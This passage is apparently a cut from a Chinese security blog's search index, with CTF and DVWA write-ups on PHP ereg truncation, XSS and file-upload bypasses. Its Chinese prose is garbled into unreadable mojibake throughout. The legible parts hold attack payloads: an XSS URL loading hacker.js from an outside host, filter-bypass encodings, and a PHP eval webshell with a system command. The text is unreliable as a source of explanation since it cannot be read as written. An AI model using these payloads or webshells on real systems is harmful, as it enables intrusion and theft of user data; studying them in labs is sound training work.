å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯å°†$aæ‰€å®šä¹‰çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯ä¸€ä¸ªè€ƒç‚¹ï¼Œä¸è®©æˆ‘ä»¬ç›´æ¥å¯¼å…¥æ–‡ä»¶ï¼Œä½†æ˜¯åˆéœ€è¦è¯»å–æ–‡ä»¶ï¼Œæƒ³åˆ°ç›´å‰çš„php:/inputç„¶ååœ¨ä¸‹é¢å†™ä¸€ä¸ªpost:bugku is a nice plateformå†å¾€ä¸‹å°±æ˜¯æ‹¿åˆ°flagçš„é™åˆ¶æ¡ä»¶äº†:æˆ‘ä»¬å…ˆæ¥çœ‹aå§eregi(a,b,c)å‡½æ•°ï¼šåœ¨bä¸­å¯»æ‰¾aï¼Œå¦‚æœæœ‰åŒ¹é…åˆ°ï¼Œå°±å°†åŒ¹é…é¡¹ç»™cåœ¨è¿™é¢˜ä¸­ï¼Œåªæœ‰ä¸¤ä¸ªå‚æ•°é‚£ä¸ªç‚¹è¦æ³¨æ„çœ‹ï¼ï¼æ˜¯è¿æ¥ç¬¦ï¼Œä¸æ˜¯é€—å·ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ„æ€æ˜¯111å’Œbçš„ç¬¬ä¸€ä¸ªå­—ç¬¦è¿›è¡Œè¿æ¥ï¼Œå¹¶å’Œ1114è¿›è¡ŒåŒ¹é…ï¼Œä¸”bçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½ä¸º4ï¼Œé•¿åº¦è¦å¤§äº5æœç´¢çŸ¥é“ eregå’Œeregiçš„æˆªæ–­æ¼æ´ï¼šâ‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸâ‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç¬¬ä¸€ä¸ªæ¼æ´ æ¥ä¸‹æ¥å°±æ˜¯idäº†ï¼Œidä»–è¯´è¦éç©ºéé›¶åé¢å¼±ç±»å‹æ¯”è¾ƒåˆè¦ç­‰äº0ï¼Œæˆ‘ä»¬å°±å»æ‰¾æ‰¾æœ‰æ²¡æœ‰æ¾æ•£æ¯”è¾ƒçš„ç±»å‹ï¼šä»è¿™ä¸ªå›¾æˆ‘ä»¬çŸ¥é“ï¼Œå­—ç¬¦ä¸²å’Œ0æ˜¯å¼±ç›¸ç­‰çš„ï¼Œæ‰€ä»¥ï¼šç»¼åˆä»¥ä¸Šå³å¯å¾—åˆ°flag","link":"/2020/12/15/bugku1/"},{"title":"XSSæ¼æ´","text":"XSSç®€ä»‹XSSè·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting),æ˜¯å°†Java scriptä»£ç æ’å…¥webé¡µé¢ä¸­ï¼Œä¹‹åå½“ç”¨æˆ·æµè§ˆé¡µé¢æ—¶, ä¼šæ‰§è¡ŒåµŒå¥—åœ¨webé¡µé¢é‡Œé¢çš„Java scriptä»£ç ,ä»è€Œè¾¾åˆ°æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ä¸ºäº†è·ŸHTMLé‡Œé¢çš„å±‚å æ ·å¼è¡¨(CSS ,Cascading Style Sheets)ä½œåŒºåˆ†ï¼Œæ‰€ä»¥å«ä½œXSS. XSSæœ¬è´¨æ¶æ„ä»£ç æœªç»è¿‡æ»¤ï¼Œä¸ç½‘ç«™æ­£å¸¸çš„ä»£ç æ··åœ¨ä¸€èµ·ï¼Œæµè§ˆå™¨æ— æ³•åˆ†è¾¨å“ªäº›è„šæœ¬æ˜¯å¯ä¿¡çš„ï¼Œå¯¼è‡´æ¶æ„è„šæœ¬è¢«æ‰§è¡Œã€‚è€Œç”±äºç›´æ¥åœ¨ç”¨æˆ·çš„ç»ˆç«¯æ‰§è¡Œï¼Œæ¶æ„ä»£ç èƒ½å¤Ÿç›´æ¥è·å–ç”¨æˆ·çš„ä¿¡æ¯ï¼Œæˆ–è€…åˆ©ç”¨è¿™äº›ä¿¡æ¯å†’å……ç”¨æˆ·å‘ç½‘ç«™å‘èµ·æ”»å‡»è€…å®šä¹‰çš„è¯·æ±‚ã€‚åœ¨éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œç”±äºè¾“å…¥çš„é™åˆ¶ï¼Œæ³¨å…¥çš„æ¶æ„è„šæœ¬è¾ƒçŸ­ï¼Œä½†å¯ä»¥é€šè¿‡å¼•å…¥å¤–éƒ¨çš„è„šæœ¬ï¼Œå¹¶æœ‰æµè§ˆå™¨æ‰§è¡Œï¼Œæ¥å®Œæˆæ¯”è¾ƒå¤æ‚çš„æ”»å‡»ç­–ç•¥ ç†è§£:XSSæ”»å‡»å’Œsqlæ³¨å…¥è¿˜è›®åƒçš„ï¼Œéƒ½æ˜¯æ³¨å…¥æ¶æ„è¯­å¥ï¼Œä½†æ˜¯xssæ˜¯é’ˆå¯¹ç½‘ç«™çš„ æ³¨å…¥æ–¹å¼ æ¥è‡ªç”¨æˆ·çš„ UGC ä¿¡æ¯//UGC:UGC äº’è”ç½‘æœ¯è¯­ï¼Œå…¨ç§°ä¸ºUser Generated Contentï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·ç”Ÿæˆå†…å®¹ï¼Œå³ç”¨æˆ·åŸåˆ›å†…å®¹ æ¥è‡ªç¬¬ä¸‰æ–¹çš„é“¾æ¥ URL å‚æ•° POST å‚æ•° Referer ï¼ˆå¯èƒ½æ¥è‡ªä¸å¯ä¿¡çš„æ¥æºï¼‰ Cookie ï¼ˆå¯èƒ½æ¥è‡ªå…¶ä»–å­åŸŸæ³¨å…¥ï¼‰ åˆ†ç±»æ ¹æ®æ”»å‡»çš„æ¥æºï¼ŒXSSæ”»å‡»å¯ä»¥åˆ†ä¸ºå­˜å‚¨å‹ï¼Œåå°„æ€§å’ŒDOMå‹ä¸‰ç§ ç±»å‹ å­˜å‚¨åŒº æ’å…¥ç‚¹ å­˜å‚¨å‹XSS åç«¯æ•°æ®åº“ HTML åå°„å‹XSS URL HTML DOMå‹XSS åç«¯æ•°æ®åº“/å‰æ®µå­˜å‚¨/URL å‰æ®µJavaScript å‚è€ƒï¼šhttps://tech.meituan.com/2018/09/27/fe-security.html åå°„å‹XSSæ”»å‡»åå°„å‹XSSæ¼æ´å¸¸è§äºé€šè¿‡URLä¼ é€’å‚æ•°çš„åŠŸèƒ½ï¼Œå¦‚ç½‘ç«™æœç´¢ï¼Œè·³è½¬ç­‰ã€‚ç”±äºéœ€è¦ç”¨æˆ·ä¸»åŠ¨æ‰“å¼€æ¶æ„çš„URLæ‰èƒ½ç”Ÿæ•ˆï¼Œæ”»å‡»è€…å¾€å¾€ä¼šç»“åˆå¤šç§æ‰‹æ®µè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ã€‚æ¯”å¦‚ä¸‹é¢çš„URLï¼š 1http://x.x.x.x:8080/dosomething?message=&quot;&lt;script src=&quot;http://www.hacktest.com:8002/xss/hacker.js&quot;&gt;&lt;/script&gt;&quot; æˆ–è€… http://localhost/test.php?param=&lt;script&gt;alert(/xss/)&lt;/script&gt; POSTçš„å†…å®¹ä¹Ÿå¯ä»¥è§¦å‘åå°„å‹XSSï¼Œåªä¸è¿‡å®ƒçš„è§¦å‘æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼ˆæ„å»ºè¡¨å•æäº¤é¡µé¢ï¼Œå¹¶å¼•å¯¼ç”¨æˆ·ç‚¹å‡»ï¼‰ï¼Œæ‰€ä»¥éå¸¸å°‘è§(ä½†æ˜¯ä¸æ˜¯å¯ä»¥) æ”»å‡»æ­¥éª¤1.æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç .2.ç”¨æˆ·æ‰“å¼€æœ‰æ¶æ„ä»£ç çš„URLæ—¶ï¼Œç½‘ç«™æœåŠ¡å™¨ç«¯å°†æ¶æ„ä»£ç ä»URLå–å‡ºï¼Œæ‹¼æ¥åœ¨HTMLè¿”å›ç»™æµè§ˆå™¨.3.ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿä¼šè¢«æ‰§è¡Œã€‚4.æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ æ³¨æ„ï¼šChromeå’ŒSafarièƒ½å¤Ÿæ£€æµ‹åˆ°urlä¸Šçš„xssæ”»å‡»ï¼Œå°†ç½‘é¡µæ‹¦æˆªæ‰ï¼Œä½†æ˜¯å…¶ä»–æµè§ˆå™¨ä¸è¡Œï¼Œå¦‚IEå’ŒFirefoxã€‚å›¾ç‰‡æ¥æº:https://www.cnblogs.com/54chensongxia/p/11643787.html å­˜å‚¨å‹XSSæ”»å‡»æ¶æ„è„šæœ¬æ°¸ä¹…å­˜å‚¨åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œå½“æµè§ˆå™¨è¯·æ±‚æ•°æ®æ—¶ï¼Œè„šæœ¬ä»æœåŠ¡å™¨ä¼ å›å¹¶æ‰§è¡Œï¼Œå½±å“èŒƒå›´æ¯”åå°„å‹å’ŒDOMå‹æ›´å¤§ï¼Œå­˜å‚¨å‹XSSæ”»å‡»çš„åŸå› ä»ç„¶æ˜¯æ²¡æœ‰åšå¥½æ•°æ®è¿‡æ»¤ï¼šå‰ç«¯æäº¤æ•°æ®è‡³æœåŠ¡å™¨ç«¯æ—¶ï¼Œæ²¡æœ‰åšå¥½è¿‡æ»¤;æœåŠ¡ç«¯åœ¨æŒ‰å—åˆ°æ•°æ®æ—¶ï¼Œåœ¨å­˜å‚¨ä¹‹å‰ï¼Œæ²¡æœ‰åšè¿‡æ»¤;å‰ç«¯ä»æœåŠ¡å™¨ç«¯è¯·æ±‚åˆ°æ•°æ®ï¼Œæ²¡æœ‰è¿‡æ»¤è¾“å‡ºã€‚ æ”»å‡»æ­¥éª¤1.æ”»å‡»è€…å°†æ¶æ„ä»£ç æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„æ•°æ®åº“ä¸­ã€‚2.ç”¨æˆ·æ‰“å¼€ç›®æ ‡ç½‘ç«™æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»æ•°æ®åº“ä¸­å–å‡ºï¼Œæ‹¼æ¥åœ¨HTMLä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚3.ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚4.æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–å†’å……ç”¨æˆ·è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œ.è¿™ç§æ”»å‡»å¸¸è§äºå¸¦æœ‰ç”¨æˆ·ä¿å­˜æ•°æ®çš„ç½‘ç«™åŠŸèƒ½ï¼Œå¦‚è®ºå›å‘å¸–ï¼Œå•†å“è¯„è®ºï¼Œç”¨æˆ·ç§ä¿¡ç­‰ã€‚ DOMå‹XSSæ”»å‡»DOMå‹XSSæ”»å‡»ï¼Œå®é™…ä¸Šå°±æ˜¯å‰ç«¯javascriptä»£ç ä¸å¤Ÿä¸¥è°¨ï¼ŒæŠŠä¸å¯ä¿¡çš„å†…å®¹æ’å…¥åˆ°äº†é¡µé¢ï¼Œåœ¨ä½¿ç”¨.innerHTMLã€.outerHTMLã€.appendChildã€document.write()ç­‰APIæ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œä¸è¦æŠŠä¸å¯ä¿¡çš„æ•°æ®ä½œä¸ºHTMLæ’å…¥åˆ°é¡µé¢ä¸Šï¼Œå°½é‡ä½¿ç”¨.innerTextã€.textContentã€.setAttribut()ç­‰. æ”»å‡»æ­¥éª¤1.æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šæ•°æ®ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚2.ç”¨æˆ·æµè§ˆå™¨æ‰§è¡Œäº†æ¶æ„ä»£ç 3.æ¶æ„çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–å†’å……ç”¨æˆ·è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œ. tipDOMå‹XSSæ”»å‡»ä¸­ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±äºå‰ç«¯javascriptè‡ªèº«çš„å®‰å…¨æ¼æ´. å‚è€ƒæ¥æº:https://www.cnblogs.com/54chensongxia/p/11643787.html å­¦ä¹ å®Œç†è®ºçŸ¥è¯†å°±å¯ä»¥å¼€å§‹å®è·µäº† å®è·µåå°„å‹:æ ¹æ®å‰é¢çš„ä»‹ç»æˆ‘ä»¬çŸ¥é“ï¼Œåå°„å‹XSSä¸»è¦æ˜¯æ„é€ äºURLä¸Šï¼ˆGETç±»å‹ï¼‰ä»¥DVWAä¸ºä¾‹ æˆ‘ä»¬æŸ¥çœ‹é¡µé¢æºç å½“æˆ‘ä»¬è¾“å…¥ 123&lt;img src=1 onerror=alert(/xss/)/&gt;æˆ–è€…ä½¿ç”¨&lt;script&gt;alert(/xss/)&lt;/script&gt;//ç›´æ¥ä½¿ç”¨è„šæœ¬è¯­è¨€ 1HTML &lt;script&gt; å…ƒç´ ç”¨äºåµŒå…¥æˆ–å¼•ç”¨å¯æ‰§è¡Œè„šæœ¬ã€‚è¿™é€šå¸¸ç”¨ä½œåµŒå…¥æˆ–è€…æŒ‡å‘ JavaScript ä»£ç ã€‚ å‚è€ƒï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/scriptä»¥åï¼Œä»–åœ¨æµè§ˆå™¨è¢«æ¸²æŸ“çš„æ—¶å€™ï¼Œæ‰§è¡Œäº† alert()å‡½æ•°åä¾¿ä¼šå¼¹æ¡†è¯´æ˜äº†ï¼Œæˆ‘ä»¬çš„å±é™©è¯­å¥åœ¨ç½‘é¡µä¸­å‘æŒ¥äº†ä½œç”¨ å­˜å‚¨å‹ï¼šå­˜å‚¨å‹æ˜¯æŒ‡æˆ‘ä»¬è¾“å…¥çš„ä»£ç è¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œåªè¦æœ‰ç”¨æˆ·ç‚¹å‡»è¯¥URL(äº§ç”ŸæŸ¥è¯¢æ•°æ®åº“çš„æ“ä½œ)ï¼Œxssè¯­å¥å³å‘æŒ¥ä½œç”¨ å½“æˆ‘ä»¬ä»å…¶ä»–é¡µé¢ç‚¹å›æ¥è¿™ä¸ªé¡µé¢ï¼Œè¿™ä¸ªçª—å£å°±ä¼šé©¬ä¸Šè·³å‡ºï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå°±å¦‚å‰é¢æ‰€è¯´çš„ï¼Œè¿™ä¸ªé¡µé¢è¦å±•ç°ç•™è¨€ï¼Œè‚¯å®šæ˜¯è°ƒç”¨äº†æŸ¥è¯¢æ•°æ®åº“çš„åŠŸèƒ½ï¼Œå¹¶å°†å…¶æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šï¼Œè€Œæˆ‘ä»¬ä¹‹å‰è¾“å‡ºçš„è¯­å¥å› ä¸ºä¹Ÿè¢«å­˜å‚¨åœ¨åŒä¸€ä¸ªæ•°æ®åº“ä¸­ï¼Œè¢«æŸ¥è¯¢å‡ºæ¥æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šï¼Œå°±ä¼šæ‰§è¡Œå…¶ä¸­çš„htmlè¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå¼¹çª— DOMå‹ï¼šDOM æ“ä½œï¼šå¯ä»¥ç®€å•ç†è§£æˆâ€œå…ƒç´ æ“ä½œâ€œï¼Œç±»ä¼¼äºä½ è¦æ›´æ¢èƒŒæ™¯é¢œè‰²ï¼Œæ›´æ¢è¯­è¨€ï¼Œæˆ–è€…åˆ é™¤å¯ä»¥çœ‹åˆ°è¿™é‡Œåšäº†ä¸€ä¸ªæ›´æ¢è¯­è¨€çš„ä»£ç ï¼Œå°†åŸæœ¬çš„è¯­è¨€æ›¿æ¢æˆæˆ‘ä»¬æ›´æ¢çš„è¯­è¨€ï¼Œæˆ‘ä»¬åœ¨urlä¸Šæ’å…¥æ¶æ„è¯­å¥ï¼Œå•å‡»æ›¿æ¢å³å¯çœ‹åˆ°é¡µé¢å¼¹å‡ºæ¡†ï¼Œä¸ºä»€ä¹ˆä¼šå¼¹å‡ºæ¡†ï¼Œå°±æ˜¯å› ä¸ºæˆ‘ä»¬çš„scriptè¯­å¥è¢«htmlè¯†åˆ«å¹¶æ‰§è¡Œäº† æ•´ç†XSSå¸¸ç”¨è¯­å¥åŠç¼–ç ç»•è¿‡å¸¸ç”¨çš„æµ‹è¯•è¯­å¥æœ‰: 1234&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x(ä»»æ„æ•°) onerror=alert(1) &gt;&lt;svg onload=alert(1)&gt;&lt;a href=javascript:alert(1)&gt; å…³äºsvgï¼ˆæ˜¯ä¸€ç§å›¾ç‰‡æ ¼å¼ï¼‰åœ¨HTMLä¸­å¯ä»¥ä½¿ç”¨çš„å…¶ä»–æ ‡ç­¾https://www.runoob.com/svg/svg-inhtml.html 12&lt;a&gt;æ ‡ç­¾å®šä¹‰è¶…é“¾æ¥ï¼Œç”¨äºä»ä¸€å¼ é¡µé¢é“¾æ¥åˆ°å¦ä¸€å¼ é¡µé¢ã€‚æ ‡ç­¾çš„ href å±æ€§ç”¨äºæŒ‡å®šè¶…é“¾æ¥ç›®æ ‡çš„ URLã€‚href å±æ€§çš„å€¼å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆæ–‡æ¡£çš„ç›¸å¯¹æˆ–ç»å¯¹ URLï¼ŒåŒ…æ‹¬ç‰‡æ®µæ ‡è¯†ç¬¦å’Œ JavaScript ä»£ç æ®µã€‚å¦‚æœç”¨æˆ·é€‰æ‹©äº† &lt;a&gt; æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå°è¯•æ£€ç´¢å¹¶æ˜¾ç¤º href å±æ€§æŒ‡å®šçš„ URL æ‰€è¡¨ç¤ºçš„æ–‡æ¡£ï¼Œæˆ–è€…æ‰§è¡Œ JavaScript è¡¨è¾¾å¼ã€æ–¹æ³•å’Œå‡½æ•°çš„åˆ—è¡¨ã€‚ ç»•è¿‡å§¿åŠ¿ï¼šè¿™é‡Œæœ‰å¿…è¦å†äº†è§£ä¸€ä¸‹æµè§ˆå™¨çš„è§£ç ä¸ç¼–ç ï¼ˆçœ‹åšå®¢httpåŸç†ï¼‰ JSç¼–ç ï¼šJSæä¾›äº†å››ç§å­—ç¬¦ç¼–ç çš„ç­–ç•¥ï¼š1.ä¸‰ä¸ªå…«è¿›åˆ¶æ•°å­— å¦‚æœä¸ªæ•°ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥0 æ¯”å¦‚eçš„ç¼–ç ä¸º\\1452.ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­— åŒä¸Š \\x653.å››ä¸ªåå…­è¿›åˆ¶æ•°å­— \\u00654.å¯¹äºä¸€äº›æ§åˆ¶å­—ç¬¦ï¼Œä½¿ç”¨ç‰¹æ®Šçš„Cç±»å‹çš„è½¬ä¹‰é£æ ¼ï¼ˆå¦‚\\nå’Œ\\rï¼‰ 1&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt; HTMLå®ä½“ç¼–ç å‘½åå®ä½“ï¼šä»¥&amp;å¼€å¤´ï¼Œä»¥åˆ†å·ç»“å°¾ï¼Œä¾‹å¦‚&lt;çš„ç¼–ç ä¸º â€œ&amp;ltâ€å­—ç¬¦ç¼–ç : åè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ASCIIç æˆ–Unicodeå­—ç¬¦ç¼–ç ï¼Œæ ·å¼ä¸ºâ€&amp;#æ•°å€¼â€ä¾‹å¦‚â€&lt;â€å¯ä»¥ç¼–ç ä¸ºâ€&amp;#060;â€œå’Œ&amp;#x3c 123&lt;ahref=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt; URLç¼–ç 123&lt;ahref=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt; å®æˆ˜â€”â€”dvwamediumä¸­çº§é˜¶æ®µæ˜¯è¿‡æ»¤äº†&lt;script&gt;æ ‡ç­¾è¿™é‡Œæœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼š1.ä½¿ç”¨å…¶ä»–ç±»å‹çš„æ ‡ç­¾ï¼Œä¾‹å¦‚&lt;img&gt;2.å¤å†™æ ‡ç­¾ï¼Œè·Ÿsqlæ³¨å…¥çš„ç»•è¿‡ä¸€æ ·ï¼Œå› ä¸ºä»–è¿™é‡Œä¹Ÿæ˜¯å€¼æ›¿æ¢ä¸€æ¬¡ highè¿™é‡Œå°±æ˜¯å®Œå…¨è¿‡æ»¤scriptï¼Œå¤å†™ä¹Ÿæ²¡ç”¨ï¼Œæ‰€ä»¥å°±æ˜¯ç”¨å…¶ä»–ç±»å‹çš„æ ‡ç­¾è¿›è¡Œç»•è¿‡å°±è¡Œäº† impossibleè®°å¾—ä»¬ä¹‹å‰æè¿‡ï¼Œæ§åˆ¶å­—ç¬¦è¢«è½¬åŒ–ä¸ºå®ä½“ç¼–ç ï¼Œè¢«è§£ç åä¼šè¢«å½“åšæ™®é€šå­—ç¬¦ï¼Œè¿™é‡Œå°†æ‰€æœ‰çš„æ§åˆ¶å­—ç¬¦éƒ½è½¬ç äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„è¯­å¥å°±éƒ½ä¸ä¼šè¢«æ‰§è¡Œäº†ã€‚","link":"/2021/01/28/XSS%E6%BC%8F%E6%B4%9E/"},{"title":"bugku3","text":"web34æç¤ºè¯´æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæœç„¶æ˜¯ï¼Œéå†äº†ä¸€æ¬¡ç›®å½•ï¼Œæ²¡æœ‰ä»€ä¹ˆæ”¶è·ï¼Œç”¨å¾¡å‰‘æ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åå°ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°è¢«è¿‡æ»¤äº†&lt;?php ?&gt; æƒ³æƒ³æœ‰æ²¡æœ‰æ›¿ä»£æ–¹å¼ï¼Œçªç„¶æƒ³èµ·æ¥ä¹‹å‰å¥½åƒæœ‰ä¸ªå¸–å­è¯´å¯ä»¥ä¸ç”¨&lt;?php 1&lt;scrpit language=php&gt;xxxxxxxx&lt;/script&gt; æ„é€ ä¸€å¥è¯æœ¨é©¬: 1&lt;script language=&quot;php&quot;&gt;@eval($_POST['cmd'])&lt;/script&gt; ä½†æ˜¯èšå‰‘è¿æ¥ä¸€ç›´æŠ¥é”™è½¬æ¢æ–¹æ³•ï¼šä½¿ç”¨systemæŒ‡ä»¤ç›´æ¥æŸ¥æ‰¾ 1&lt;script language=php&gt;system(&quot;find / -name flag*&quot;);&lt;/script&gt; ç„¶åfile/flag å°±å¯ä»¥è·å¾—flag web32è¿™æ˜¯æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œè¿‡æ»¤äº†phpæ–‡ä»¶åŒ…æ‹¬å…¶ä»–æ–‡ä»¶è¿™é‡Œå¤ä¹ ä¸€ä¸‹å‡ ä¸ªç»•è¿‡å§: 00æˆªæ–­ï¼šä¸è¡Œï¼Œæœ€ç»ˆçš„æ–‡ä»¶åæ˜¯ä¸å¯æ§çš„ï¼Œå®ƒä¼šè‡ªåŠ¨åŠ ä¸Š.jpgä½¿ç”¨å…¶ä»–åç¼€è¿›è¡Œç»•è¿‡ï¼Œä¾‹å¦‚php4ï¼Œå¹¶ä¿®æ”¹Content-Typeï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹MIMEï¼Œä½†æ˜¯è¿˜æ˜¯ä¸è¡Œï¼ŒæŸ¥äº†ä¸€ä¸‹è¯´æ˜¯ä¸Šé¢ä¹Ÿæœ‰ä¸€å¤„Content-Type: multipartï¼Œåé¢multipartæœ‰çš„å­—æ¯æ”¹å¤§å†™ï¼Œä½†æ˜¯ä¸æ˜¯å¾ˆç†è§£ä¸ºä»€ä¹ˆ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;html&gt;&lt;body&gt;&lt;?php $flag = &quot;flag{test}&quot;?&gt;&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;My name is margin,give me a image file not a php&lt;br&gt;&lt;br&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;?phpfunction global_filter(){ $type = $_SERVER[&quot;CONTENT_TYPE&quot;]; if (strpos($type,&quot;multipart/form-data&quot;) !== False){ $file_ext = substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], '.')+1); $file_ext = strtolower($file_ext); if (stripos($file_ext,&quot;php&quot;) !== False){ die(&quot;Invalid File&lt;br /&gt;&quot;); } }}?&gt;&lt;?phpglobal_filter();if ((stripos($_FILES[&quot;file&quot;][&quot;type&quot;],'image')!== False) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 10*1024*1024)){ if ($_FILES[&quot;file&quot;][&quot;error&quot;] == 0){ $file_ext = substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], '.')+1); $file_ext = strtolower($file_ext); $allowexts = array('jpg','gif','jpeg','bmp','php4'); if(!in_array($file_ext,$allowexts)){ die(&quot;give me a image file not a php&quot;); } $_FILES[&quot;file&quot;][&quot;name&quot;]=&quot;bugku&quot;.date('dHis').&quot;_&quot;.rand(1000,9999).&quot;.&quot;.$file_ext; if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])){ echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &lt;br /&gt;&quot;; } else{ if (!file_exists('./upload/')){ mkdir (&quot;./upload/&quot;); system(&quot;chmod 777 /var/www/html/upload&quot;); } move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Upload Success&lt;br&gt;&quot;; $filepath = &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Stored in: &quot; .&quot;&lt;a href='&quot; . $filepath . &quot;' target='_blank'&gt;&quot; . $filepath . &quot;&lt;br /&gt;&quot;; } }}else{ if($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0){ echo &quot;You was catched! :) &lt;br /&gt;&quot;; }}?&gt;&lt;/body&gt;&lt;/html&gt; æ”¶è·:çœ‹äº†æºç ï¼ŒåŸæ¥ï¼Œè¿™é¢˜ä»–å°±æ˜¯æ•…æ„è¦åœ¨é‚£è¾¹å¼„ä¸€ä¸ªåˆ¤æ–­ï¼ŒstrposåŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥multipart/form-dataæ›´æ”¹å¤§å°å†™å°±å¯ä»¥ç»•è¿‡äº†ï¼Œä½ æ²¡æ”¹æœ‰çš„å¤§å°å†™ï¼Œä½ å°±æ— æ³•ä¸Šä¼ æˆåŠŸï¼Œæ„Ÿè§‰è›®æ— 